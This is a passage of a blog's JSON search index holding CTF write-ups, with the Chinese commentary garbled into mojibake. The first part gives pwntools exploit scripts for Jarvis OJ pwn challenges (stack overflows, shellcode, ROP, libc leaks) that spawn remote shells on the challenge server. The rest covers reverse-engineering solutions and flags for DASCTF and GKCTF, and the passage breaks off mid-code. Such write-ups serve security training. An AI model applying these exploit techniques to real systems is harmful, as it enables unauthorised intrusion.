0x88*b\u0026#39;a\u0026#39;+ p64(add_aa) + p64(0)+ rbx p64(1)+ rbp p64(libc_start_main_got)+ r12 ---\u0026gt;called p64(7)+ r13 --\u0026gt; rdx p64(0x1000) + r14 -- \u0026gt; rsi p64(0x600000)+ r15 ---\u0026gt; edi p64(add_90)+ p64(0)+ p64(0)+ p64(1)+ p64(gmon_start)+ p64(0)+ p64(0)+ p64(0)+ p64(add_90) è¿˜æ˜¯æŒºç»•çš„ ã€‚ã€‚ã€‚ã€‚ã€‚\n","date":"8 July 2020","permalink":"/achieve/2019to2021/jarvis-oj-pwn-level4to6/","section":"archive","summary":"levle4 # æ²¡æœ‰libcäº†ï¼Œè¦ç”¨ DynELFé…åˆ leak æ¥æ‰¾systemçš„çœŸæ­£åœ°å€","title":"Jarvis_OJ_pwn_level4to6"},{"content":"\rlevel0 # x86æ ˆæº¢å‡º\nexp1 # from pwn import * #nc pwn2.jarvisoj.com 9881 io = remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9881) io.recvuntil(\u0026#34;Hello, World\\n\u0026#34;) payload = b\u0026#39;a\u0026#39;*0x88 +p64(0x0400596) io.sendline(payload) io.interactive() # CTF{713ca3944e92180e0ef03171981dcd41} level1 # x86æ ˆæº¢å‡º + pwntoolsè‡ªå¸¦çš„x86 shellcodeä½¿ç”¨\nä¿æŠ¤å…¨ç°,å¯ä»¥å†™shellcodeäº†\ngdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial\nssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] printf(\u0026#34;What\u0026#39;s this:%p?\\n\u0026#34;, \u0026amp;buf); return read(0, \u0026amp;buf, 0x100u); } è¿™é‡Œä¼šè¾“å‡ºbufçš„åœ°å€ï¼Œåœ¨bufå†…è®¾ç½®shellcodeï¼Œç„¶åè¦†ç›–å †æ ˆå°†retè·³è½¬çš„ç›®æ ‡ä¿®æ”¹åˆ°bufçš„å¼€å¤´ï¼ˆå³ set ip åˆ°shellcodeçš„èµ·å§‹ç‚¹ï¼‰ç„¶åæ‰§è¡Œshellcodeï¼Œå†è¿›äº¤äº’ç³»ç»Ÿ\nexp2 # from pwn import * context( arch = \u0026#39;i386\u0026#39;) # å…ˆé€‰ç›¸åº”ç³»ç»Ÿ # log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./level1\u0026#39;) io = remote(\u0026#39;pwn2.jarvisoj.com\u0026#39;, 9877) shellcode = asm(shellcraft.sh()) #print(\u0026#34;shell:\\n\u0026#34;,shellcraft.sh()) # What\u0026#39;s this:0x ffb0aa80 ?\\n buf = int(io.recvline()[14: -2], 16) payload = shellcode + b\u0026#39;\\x90\u0026#39; * (0x88 + 0x4 - len(shellcode)) payload += p32(buf) #ä¿®æ”¹ ret è·³è½¬ç›®æ ‡ io.send(payload) io.interactive() # CTF{82c2aa534a9dede9c3a0045d0fec8617} level2 # x86æ ˆæº¢å‡º + x86ä¼ å‚è§„å¾‹\nfrom pwn import * #è®¾ç½®ç›®æ ‡æœºçš„ä¿¡æ¯ï¼Œç”¨æ¥å»ºç«‹è¿œç¨‹é“¾æ¥ï¼Œurlæˆ–ipæŒ‡æ˜äº†ä¸»æœºï¼Œportè®¾ç½®ç«¯å£ r = remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;, 9878) # nc pwn2.jarvisoj.com 9878 system=0x08048320 #r.recvuntil(\u0026#39;Input:\u0026#39;) sh = 0x0804A024 payload = b\u0026#39;a\u0026#39; * (0x88+4) + p32(system)+ p32(0) +p32(sh) r.recvline(\u0026#34;Input:\u0026#34;) r.sendline(payload) r.interactive() # 0804A024 /bin/sh # 08048320 system åˆç”±äºè°ƒç”¨å‡½æ•°å‹å‚æ•°æ˜¯é€†åºï¼Œæ‰€ä»¥å°†systemå”¯ä¸€ä¸€ä¸ªå‚æ•°æ”¾åœ¨systemçš„è¿”å›ä½ç½®åé¢ä¸€ä¸ªä½ç½®å°±okäº†\nlevel2 x64 # å…ˆç”¨ROPgadgetæ‰¾ç¨‹åºå†…æœ‰æ²¡æœ‰ pop rdi å¯ç”¨æ‹¿æ¥ç”¨ (ROPgadgetçœŸæ˜¯å¥½ä¸œè¥¿)\n0x00000000004006b3 : pop rdi ; ret pop rdi æŠŠbinsh_addrä¼ å…¥rdi\nret æŠŠsystem_addr ç»™ rip\nå°±å˜æˆäº†æ‰§è¡Œ system ( [rdi] )\nexp # from pwn import * system_addr=0x000000000040063E poprdi_drt=0x00000000004006b3 binsh_addr=0x0000000000600A90 p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9882) p.recvline() payload=b\u0026#39;A\u0026#39;*0x80+b\u0026#34;A\u0026#34;*8+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr) p.send(payload) p.interactive() \u0026#39;\u0026#39;\u0026#39; x64 ä¼˜å…ˆä½¿ç”¨ç”¨å¯„å­˜å™¨ä¼ å‚ rdi, rsi, rdx, rcx, r8, r9ã€‚å½“å‚æ•°ä¸º 7 ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» \u0026#34;å³å‘å·¦\u0026#34; æ”¾å…¥æ ˆä¸­ã€‚ CTF{081ecc7c8d658409eb43358dcc1cf446} \u0026#39;\u0026#39;\u0026#39; level3 x86 # é”äº† NX ,è¦æ³„éœ² libc\nä¹‹å‰æ²¡æ€ä¹ˆçœ‹æ‡‚æ³„éœ² libcçš„æ“ä½œï¼Œè¿™ä¸¤å¤©é—²ç€çœ‹äº†çœ‹ç®—æ˜¯çœ‹æ˜ç™½äº†\nfrom pwn import * io = remote(\u0026#39;pwn2.jarvisoj.com\u0026#39;,9879) write_plt=0x8048340 read = 0x804844B write_got=0x804A018 payload1 = b\u0026#39;a\u0026#39; * (0x88 + 0x4) + p32(write_plt) + p32(read) + p32(0x01) + p32(write_got) + p32(0x04) io.recvuntil(\u0026#39;Input:\\n\u0026#39;) io.sendline(payload1) write_add = u32(io.recv(4)) # è®¡ç®—systemå‡½æ•°å’Œ/bin/shåœ¨å†…å­˜ä¸­çš„çœŸå®åœ°å€ libc = ELF(\u0026#39;./libc-2.19.so\u0026#39;) t = write_add - libc.symbols[\u0026#39;write\u0026#39;] system = t + libc.symbols[\u0026#39;system\u0026#39;] binsh = t + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) payload2 = b\u0026#39;a\u0026#39;*(0x88 + 0x4) payload2 += p32(system) + p32(0) + p32(binsh) io.recvuntil(\u0026#39;Input:\\n\u0026#39;) io.sendline(payload2) io.interactive() io.close() å¥½åƒåªè¦æ˜¯ç¨‹åºå’Œlibcé‡Œé¢æœ‰çš„å‡½æ•°éƒ½å¯ä»¥æ‹¿æ¥æ³„éœ²\u0026hellip;\næ¯æ¬¡è¿è¡Œå†…å­˜ä¸­çš„ä½ç½®ä¼šå‘ç”Ÿå˜åŒ–\næº¢å‡ºä¿®æ”¹retè·³è½¬å€¼\næ‰§è¡Œåˆ°writeå†…éƒ¨ï¼Œå‡½æ•°å°† write_got ä½œä¸ºå‚æ•°è¾“å‡ºåœ¨äº†å±å¹•ä¸Š\nlevel3 x64 # å’Œx86ç‰ˆçš„åŒºåˆ«æ˜¯ä¼ å‚è¦å€ŸåŠ©å¯„å­˜å™¨,æ‰€ä»¥è¦æ‰¾ pop æ¥ä¼ å‚(è¯è¯´ä¼ å‚æ–¹å¼åº”è¯¥è¿˜æœ‰å¾ˆå¤šå§?)\n--\u0026gt; 0x00000000004006b3 : pop rdi ; ret --\u0026gt; 0x00000000004006b1 : pop rsi ; pop r15 ; ret from pwn import * p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;, \u0026#34;9883\u0026#34;) elf=ELF(\u0026#39;./level3_x64\u0026#39;) libc=ELF(\u0026#39;./libc-2.19.so\u0026#39;) context.log_level=\u0026#34;debug\u0026#34; main_add=0x4005e6 writeplt=elf.symbols[\u0026#39;write\u0026#39;] writegot=elf.got[\u0026#39;write\u0026#39;] rdiset=0x00000000004006b3 # 1 rsiset=0x00000000004006b1 #2 payload0 = 0x88*b\u0026#39;a\u0026#39; payload0+=p64(rdiset) payload0+=p64(1) # 1 èµ‹ç»™ rdi payload0+=p64(rsiset) payload0+=p64(writegot) # writegot ç»™ rsi payload0+=p64(8) # è·³è¿‡ r15 payload0+=p64(writeplt)# write(1,writegot,0x200) rdxçš„0x200æ˜¯readç»™çš„ payload0+=p64(main_add) p.recvuntil(\u0026#34;Input:\\n\u0026#34;) p.sendline(payload0) writeaddr=p.recv(8)# æ”¶é›† writegot åœ°å€ writeaddr=u64(writeaddr) sysoffest=libc.symbols[\u0026#39;system\u0026#39;] binoffest=next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) t = writeaddr - libc.symbols[\u0026#39;write\u0026#39;] system=sysoffest + t sh=binoffest + t payload1 = b\u0026#39;a\u0026#39;*0x88 payload1 += p64(rdiset) payload1 += p64(sh)+p64(system) p.recvuntil(\u0026#34;Input:\\n\u0026#34;) p.sendline(payload1) p.interactive() ","date":"8 July 2020","permalink":"/achieve/2019to2021/jarvis-oj-pwn-level1to3/","section":"archive","summary":"level0 # x86æ ˆæº¢å‡º","title":"Jarvis_OJ_pwn_level1to3"},{"content":" ç«¯åˆèŠ‚å›å±±é‡Œç©äº†ä¸€è¶Ÿï¼Œåšé¢˜æ—¶é—´ä»…æœ‰åŠå¤©ï¼Œåšäº†çš„ä¾æ—§åªæœ‰reã€‚ã€‚ã€‚ã€‚\nT0p_Gear # ç­¾åˆ°é¢˜ï¼Œä½†åšæ³•ä¸æ˜¯å¾ˆç­¾åˆ°\nä¸‰ä¸ªåˆ¤æ–­è¾“å…¥ä¸‰æ®µå­—ç¬¦ä¸²æœ€åæ‹¿åˆ°å®Œæ•´flag\nç»è¿‡åŠ¨è°ƒå‘ç°fun1å‡½æ•°æ˜¯æ‹¿æ¥æ¯”è¾ƒçš„ï¼Œåœ¨fun1å…¥å£æŠŠå­—ç¬¦ä¸²copyä¸‹æ¥å°±è¡Œäº†\nflag1 c92bb6a5 # flag1å¯†æ–‡æ ¡éªŒ\n_BOOL8 __usercall chk1@\u0026lt;rax\u0026gt;(YouWouldChk *this@\u0026lt;rdi\u0026gt;, __int64 a2@\u0026lt;rbp\u0026gt;, __m256i a3@\u0026lt;ymm7\u0026gt;) { __int128 v4; // [rsp-28h] [rbp-28h] unsigned __int64 v5; // [rsp-10h] [rbp-10h] __int64 v6; // [rsp-8h] [rbp-8h] __asm { endbr64 } v6 = a2; v5 = __readfsqword(0x28u); v4 = (unsigned __int64)\u0026#39;5a6bb29c\u0026#39;; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;I drew a :\u0026#34;, 0LL); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, YouWouldChk::chk1(void)::JC); return (unsigned int)fun1((unsigned __int64)YouWouldChk::chk1(void)::JC, (__int64)\u0026amp;v4, a3) == 0; } flag2 a6c30091 # flag2è¦ä»é™„ä»¶ä¸­è¯»å–ç§˜é’¥æ¥è§£ç å­—ç¬¦ä¸²ï¼Œåœ¨fun1å¤„copyä¸‹æ¥å°±è¡Œäº†\n__asm { endbr64 } key = a3; // ç¥å¿…å­—ç¬¦ä¸² v25 = __readfsqword(0x28u); v17 = \u0026#39;txt.tt\u0026#39;; v18 = 0LL; v19 = 0LL; v20 = 0LL; v21 = 0LL; v22 = 0LL; v23 = 0LL; v24 = 0LL; v6 = YouWouldChk::readStrFromFile(this, (char *)\u0026amp;v17, (char *)\u0026amp;v12, (__int64)\u0026amp;key); YouWouldChk::deAes(this, (char *)\u0026amp;v12, a2, v6, (__int64)\u0026amp;key, a5, a6);//aesè§£å¯† v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; sub_4010D0((unsigned __int64)\u0026amp;v12, (signed __int64)\u0026amp;v13, (unsigned __int64)\u0026amp;v12, a5, a6); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Richard steals some:\u0026#34;, v7); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, YouWouldChk::deAesFileAndMore(char *)::RH); i_1 = 0; for ( i = 0; *((_BYTE *)\u0026amp;v12 + i); ++i ) { if ( *((_BYTE *)\u0026amp;key + i - 144) != \u0026#39;f\u0026#39; ) { v8 = i_1++; *((_BYTE *)\u0026amp;key + v8 - 144) = *((_BYTE *)\u0026amp;key + i - 144); } } *((_BYTE *)\u0026amp;key + i_1 - 144) = 0; return (unsigned int)fun1((unsigned __int64)\u0026amp;v12, (__int64)YouWouldChk::deAesFileAndMore(char *)::RH, a4) == 0; flag3 24566d882d4bc7ee # å’Œflag1ä¸€æ ·fun1å¤„å¤åˆ¶ä¸‹æ¥\nç„¶åæ‹¼åˆ°ä¸€èµ·\nc92bb6a5a6c3009124566d882d4bc7ee\nmaze # ç®€å•åœ°å›¾ï¼Œä¸åƒä¸Šä¸ªæœˆæœ‰å¤šé‡è·¯å¾„æå¾—å¾ˆè¿·æƒ‘\nåŠ¨è°ƒè½½å…¥åœ°å›¾å¤åˆ¶å‡ºæ¥ï¼Œç¨å¾®å¤„ç†ä¸€ä¸‹\nX X X X X # X X X X X X X X X X X X X X X X X X X X X X X X X X md5(jkkjjhjjkjjkkkuukukkuuhhhuukkkk )\nMagia # for ( i = 31; i_1 \u0026lt; i; --i ) { if ( (flag[i] ^ flag[i_1]) != *(\u0026amp;v59 + i_1) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } if ( (flag[i] \u0026amp; flag[i_1]) != *(\u0026amp;v43 + i_1) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } if ( (flag[i_1] \u0026amp; 0xF) != *(\u0026amp;v11 + i_1) || (flag[i] \u0026amp; 0xF) != *(\u0026amp;v11 + i) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } ++i_1; } æ ¹æ®ä»¥ä¸Šåˆ¤æ–­æ¡ä»¶æˆ‘ä»¬å¯ä»¥å¾—åˆ°81ä¸ªç¬¦åˆæ¡ä»¶çš„flag\nNep{mYrclU_a^dOmaxooisonotofree} Nep{mYrclU_a^d_mahooisonotofree} Nep{mYrclU_a^domaXooisonotofree} Nep{mYrclU_andOmaxo_isonotofree} Nep{mYrclU_and_maho_isonotofree} Nep{mYrclU_andomaXo_isonotofree} Nep{mYrclU_a~dOmaxoOisonotofree} Nep{mYrclU_a~d_mahoOisonotofree} Nep{mYrclU_a~domaXoOisonotofree} Nep{mYrcle_a^dOmaxoois_notofree} Nep{mYrcle_a^d_mahoois_notofree} Nep{mYrcle_a^domaXoois_notofree} Nep{mYrcle_andOmaxo_is_notofree} Nep{mYrcle_and_maho_is_notofree} Nep{mYrcle_andomaXo_is_notofree} Nep{mYrcle_a~dOmaxoOis_notofree} Nep{mYrcle_a~d_mahoOis_notofree} Nep{mYrcle_a~domaXoOis_notofree} Nep{mYrclu_a^dOmaxooisOnotofree} Nep{mYrclu_a^d_mahooisOnotofree} Nep{mYrclu_a^domaXooisOnotofree} Nep{mYrclu_andOmaxo_isOnotofree} Nep{mYrclu_and_maho_isOnotofree} Nep{mYrclu_andomaXo_isOnotofree} Nep{mYrclu_a~dOmaxoOisOnotofree} Nep{mYrclu_a~d_mahoOisOnotofree} Nep{mYrclu_a~domaXoOisOnotofree} Nep{mirclU_a^dOmaxooisonot_free} Nep{mirclU_a^d_mahooisonot_free} Nep{mirclU_a^domaXooisonot_free} Nep{mirclU_andOmaxo_isonot_free} Nep{mirclU_and_maho_isonot_free} Nep{mirclU_andomaXo_isonot_free} Nep{mirclU_a~dOmaxoOisonot_free} Nep{mirclU_a~d_mahoOisonot_free} Nep{mirclU_a~domaXoOisonot_free} Nep{mircle_a^dOmaxoois_not_free} Nep{mircle_a^d_mahoois_not_free} Nep{mircle_a^domaXoois_not_free} Nep{mircle_andOmaxo_is_not_free} Nep{mircle_and_maho_is_not_free} Nep{mircle_andomaXo_is_not_free} Nep{mircle_a~dOmaxoOis_not_free} Nep{mircle_a~d_mahoOis_not_free} Nep{mircle_a~domaXoOis_not_free} Nep{mirclu_a^dOmaxooisOnot_free} Nep{mirclu_a^d_mahooisOnot_free} Nep{mirclu_a^domaXooisOnot_free} Nep{mirclu_andOmaxo_isOnot_free} Nep{mirclu_and_maho_isOnot_free} Nep{mirclu_andomaXo_isOnot_free} Nep{mirclu_a~dOmaxoOisOnot_free} Nep{mirclu_a~d_mahoOisOnot_free} Nep{mirclu_a~domaXoOisOnot_free} Nep{myrclU_a^dOmaxooisonotOfree} Nep{myrclU_a^d_mahooisonotOfree} Nep{myrclU_a^domaXooisonotOfree} Nep{myrclU_andOmaxo_isonotOfree} Nep{myrclU_and_maho_isonotOfree} Nep{myrclU_andomaXo_isonotOfree} Nep{myrclU_a~dOmaxoOisonotOfree} Nep{myrclU_a~d_mahoOisonotOfree} Nep{myrclU_a~domaXoOisonotOfree} Nep{myrcle_a^dOmaxoois_notOfree} Nep{myrcle_a^d_mahoois_notOfree} Nep{myrcle_a^domaXoois_notOfree} Nep{myrcle_andOmaxo_is_notOfree} Nep{myrcle_and_maho_is_notOfree} Nep{myrcle_andomaXo_is_notOfree} Nep{myrcle_a~dOmaxoOis_notOfree} Nep{myrcle_a~d_mahoOis_notOfree} Nep{myrcle_a~domaXoOis_notOfree} Nep{myrclu_a^dOmaxooisOnotOfree} Nep{myrclu_a^d_mahooisOnotOfree} Nep{myrclu_a^domaXooisOnotOfree} Nep{myrclu_andOmaxo_isOnotOfree} Nep{myrclu_and_maho_isOnotOfree} Nep{myrclu_andomaXo_isOnotOfree} Nep{myrclu_a~dOmaxoOisOnotOfree} Nep{myrclu_a~d_mahoOisOnotOfree} Nep{myrclu_a~domaXoOisOnotOfree} ä½†æ˜¯æ ¹æ®å¸¸è¯†å¯ä»¥æ‰¾åˆ°Nep{mircle_and_maho_is_not_free}\nä¹‹åè¯¥flagå‚ä¸ä¸€æ®µsmcï¼Œä¼—æ‰€å‘¨çŸ¥å•å±‚smcå’Œæ²¡æœ‰æ˜¯ä¸€æ ·çš„\nä½†æ˜¯è¿™ä¸ªé¢˜åé¢å‡ºç°äº†å¥‡æ€ªçš„ä¸œè¥¿\nsmcå†…éƒ¨ï¼š # v2 = 37; v3 = 110; v4 = 49; v5 = 19; v6 = 47; v7 = 40; v8 = 32; v9 = 60; v10 = 53; v11 = 52; v12 = 48; v13 = 109; v14 = 59; v15 = 54; v16 = 7; v17 = 60; v18 = 56; v19 = 127; v20 = 93; v21 = 84; v22 = 40; v23 = 30; v24 = 26; v25 = 47; v26 = 59; v27 = 43; v28 = 85; v29 = 54; v30 = 73; v31 = 109; v32 = 102; v33 = 126; v34 = 0; v35 = 1601399123; v36 = 1818588528; v37 = 1834967404; v0 = __inbyte(0x66u); v38 = 8545; v39 = BYTE2(dword_405150); v40 = 0i64; v41 = 0; v42 = 0; for ( i = 0; i \u0026lt; strlen(flag); ++i ) *((_BYTE *)\u0026amp;v43 + i - 73) = *((_BYTE *)\u0026amp;v43 + (signed int)i % 18 - 37) ^ *((_BYTE *)\u0026amp;v43 + 4 * i - 205) ^ flag[i]; åé¢å¹¶æ²¡æœ‰å¯¹flagè¿›è¡Œåˆ¤æ–­ï¼Œç›´æ¥æŠŠflagè·‘å‡ºæ¥äº†ã€‚ã€‚ã€‚ã€‚\n.scode:00403219 loc_403219: .scode:00403219 0EC xor ecx, eax .scode:0040321B 0EC mov edx, [ebp-0D8h] .scode:00403221 0EC mov [ebp+edx-4Ch], cl \u0026lt;--- .scode:00403225 1D8 jmp loc_403186 Stack[0000633C]:0019FE58 a8b272473500a45 db \u0026#39;8b272473500a451286ab225413f1debd\u0026#39;,0 8b272473500a451286ab225413f1debd\n521 # çœ‹èµ·æ¥èŠ±é‡Œèƒ¡å“¨çš„rc4\ncppç¨‹åºç›´æ¥å¯¹ç€ä¼ªä»£ç è°ƒè¯•ä¹Ÿå¯ä»¥å¾—åˆ°æ¯”è¾ƒå¥½çš„æ•ˆæœ\nv16 = __readfsqword(0x28u); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;FLAG, a2); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;a3, a2, v2); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;v13, a2, v3); init_key((__int64)v15);//ç§˜é’¥ç”Ÿæˆ std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(\u0026amp;a3, v15); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v15); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::length(); if ( v4 != 37 ) { a1 = 0; v5 = 0; } else { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v15, \u0026amp;FLAG); v6 = chk2((__int64)v15); // åˆ¤æ–­æ ¼å¼ std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v15); if ( v6 ) { qmemcpy(v15, \u0026amp;unk_55AD074D7DC0, sizeof(v15)); encode((__int64)\u0026amp;FLAG_1, (__int64)\u0026amp;FLAG, (__int64)\u0026amp;a3);//RC4åŠ å¯† std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(\u0026amp;v13, \u0026amp;FLAG_1); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(\u0026amp;FLAG_1); for ( i = 0; ; ++i ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::length(); if ( i \u0026gt;= v7 ) break; if ( *(char *)std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](\u0026amp;v13, i) != v15[i] ) { a1 = 0; { __int64 result; // rax unsigned int v5; // eax unsigned int v6; // [rsp+1Ch] [rbp-Ch] int v7; // [rsp+20h] [rbp-8h] unsigned int i; // [rsp+24h] [rbp-4h] rc4_init(a3, a4); v6 = 0; v7 = 0; for ( i = 0; ; ++i ) { result = i; if ( a2 \u0026lt;= i ) break; v6 = (unsigned __int8)(((unsigned int)((signed int)(v6 + 1) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24) + v6 + 1) - ((unsigned int)((signed int)(v6 + 1) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24); v5 = (unsigned int)((v7 + tab[v6]) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24; v7 = (unsigned __int8)(v5 + v7 + tab[v6]) - v5; exchange((char *)\u0026amp;tab[v6], (char *)\u0026amp;tab[v7]); *(_BYTE *)((signed int)i + a1) ^= tab[(unsigned __int8)(tab[v6] + tab[v7])]; } return result; } å¾ˆæ˜æ˜¾çš„rc4,å¯¹ç€å¼‚æˆ–ç‚¹çœ‹æ•°æ®å°±è¡Œäº†\nl = [0x80, 0x59, 0x23, 0x35, 0x2b, 0x4, 0x8f, 0x1e, 0x55, 0x26, 0x32, 0xe8, 0x50, 0x57, 0x81, 0xa, 0xc4, 0x94, 0x25, 0xdc, 0x84, 0x69, 0x76, 0xe6, 0x54, 0xb, 0x6e, 0xf3, 0x53, 0x31, 0x62, 0x49, 0xc, 0xff, 0xff, 0xfa, 0x22, 0x0] flag = [0x4e, 0x65, 0x70, 0x7b, 0x31, 0x32, 0x33, 0x41, 0x42, 0x43, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x7d, 0x0] encode = [0x80, 0x59, 0x23, 0x35, 0x22, 0x73, 0x8d, 0x1a, 0x51, 0x5d, 0x30, 0xe8, 0x57, 0x26, 0xf6, 0x7, 0xc6, 0x92, 0x5e, 0xdc, 0x83, 0x1f, 0x76, 0x92, 0x25, 0xf, 0x65, 0xfb, 0x2e, 0x4d, 0x6b, 0x45, 0x3, 0x87, 0xe9, 0x9f, 0x22, 0x0] for i in range(37):\tprint(chr(encode[i]^(l[i]^flag[i])),end=\u0026#39;\u0026#39;) Nep{8E1EF8215BC841CAE5D17CCA77EAA7F4}\npyCharm # æˆ‘æ‘Šç‰Œäº†,è¿™é¢˜æˆ‘è’™çš„ :D æŠŠå¾ˆå¯ç–‘çš„å­—ç¬¦ä¸²æ‹¿å‡ºæ¥,è¯•äº†è¯•æ˜¯ä¸è¡Œçš„,åˆè§‰å¾—aå¾ˆå¯ç–‘,æŠŠaå…¨å»æ‰å°±å¯ä»¥æ­£å¸¸è§£base64äº†\u0026hellip;.\nYamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM= \u0026gt;\u0026gt; YmNlZTcxZDhjYmI0NDU3YjUwNWNjMjUwNWI3M2NhMGM= \u0026gt;\u0026gt; bcee71d8cbb4457b505cc2505b73ca0c ","date":"27 June 2020","permalink":"/achieve/2019to2021/dasctf-2020-6/","section":"archive","summary":"ç«¯åˆèŠ‚å›å±±é‡Œç©äº†ä¸€è¶Ÿï¼Œåšé¢˜æ—¶é—´ä»…æœ‰åŠå¤©ï¼Œåšäº†çš„ä¾æ—§åªæœ‰reã€‚ã€‚ã€‚ã€‚","title":"å®‰æ’å…­æœˆèµ›-2020-reéƒ¨åˆ†"},{"content":" å‘ç°GKCTFåœ¨buuä¸Šé¢æŒ‚äº†å¥½ä¹…ï¼Œå¹²è„†åšç€ç©ç©å¥½äº†\nCheck_1n # æ‰“å¼€ä¸€çœ‹ï¼Œæ˜¯ä¸€ä¸ª çœŸ-è™šæ‹Ÿæœºï¼Œvmçœ‹äº†ç›´å‘¼å†…è¡Œ\nç›´æ¥æ‰¾å­—ç¬¦ä¸²\nè§£å‡ºæ¥æ˜¯è¿™æ ·çš„\nWhy don\u0026rsquo;t you try the magic brick game\nç„¶ååˆæ‰¾åˆ°ä¸€ä¸²å¾ˆåƒå¯†æ–‡çš„å­—ç¬¦ä¸²\nçœ‹ä¸€ä¸‹è°ƒç”¨äº†ä»–çš„å‡½æ•°\ndecode: # for ( i = 0; i \u0026lt; str; ++i ) { v3 = byte_175E270[(unsigned __int8)a1[i]]; if ( v3 \u0026lt; 0 ) { sub_406B70(v8); return 0; } for ( j = \u0026amp;v8[v9 - 1]; j \u0026gt;= str2; --j ) { v2 = 58 * (unsigned __int8)*j + v3; *j = v2 % 0x100; v3 = BYTE1(v2); } if ( v3 \u0026gt; 0 ) { if ( --str2 \u0026lt; v8 ) { sub_406B70(v8); return 0; } *str2 = v3; } } for ( k = 0; k \u0026lt; \u0026amp;v8[v9] - str2; ++k ) v8[k] = str2[k]; v8[k] = 0; return v8; æ˜¯base58çš„ç®—æ³•ï¼Œç›´æ¥åœ¨çº¿è§£å°±å¯ä»¥äº†\nflag{f5dfd0f5-0343-4642-8f28-9adbb74c4ede}\nbabyDriver # 0x140001380é‡Œé¢æ˜¯ä¸€ä¸ªè¿·å®«\ncode: # __int64 __fastcall map_0(__int64 a1, __int64 str_2) { __int64 v2; // rbx __int64 str_1; // rdi __int64 v4; // rax int local; // ecx __int16 *str; // rsi __int64 Sbox; // rbp __int16 s; // dx char siep; // dl CHAR *v10; // rcx v2 = str_2; if ( *(_DWORD *)(str_2 + 48) \u0026gt;= 0 ) { str_1 = *(_QWORD *)(str_2 + 24); v4 = *(_QWORD *)(str_2 + 56) \u0026gt;\u0026gt; 3; if ( (_DWORD)v4 ) { local = value1; str = (__int16 *)(str_1 + 2); Sbox = (unsigned int)v4; while ( *(_WORD *)(str_1 + 4) ) { LABEL_28: str += 6; if ( !--Sbox ) goto LABEL_29; } map[local] = 46; s = *str; if ( *str == \u0026#39;\\x17\u0026#39; ) { if ( local \u0026amp; 0xFFFFFFF0 ) { local -= 0x10; goto LABEL_21; } local += 0xD0; value1 = local; } if ( s == \u0026#39;%\u0026#39; ) { if ( (local \u0026amp; 0xFFFFFFF0) != 0xD0 ) { local += 16; goto LABEL_21; } local -= 0xD0; value1 = local; } if ( s == \u0026#39;$\u0026#39; ) { if ( local \u0026amp; 0xF ) { --local; goto LABEL_21; } local += 15; value1 = local; } if ( s != \u0026#39;\u0026amp;\u0026#39; ) goto LABEL_22; if ( (local \u0026amp; 0xF) == 15 ) local -= 15; else ++local; LABEL_21: value1 = local; LABEL_22: siep = map[local]; if ( siep == \u0026#39;*\u0026#39; ) { v10 = 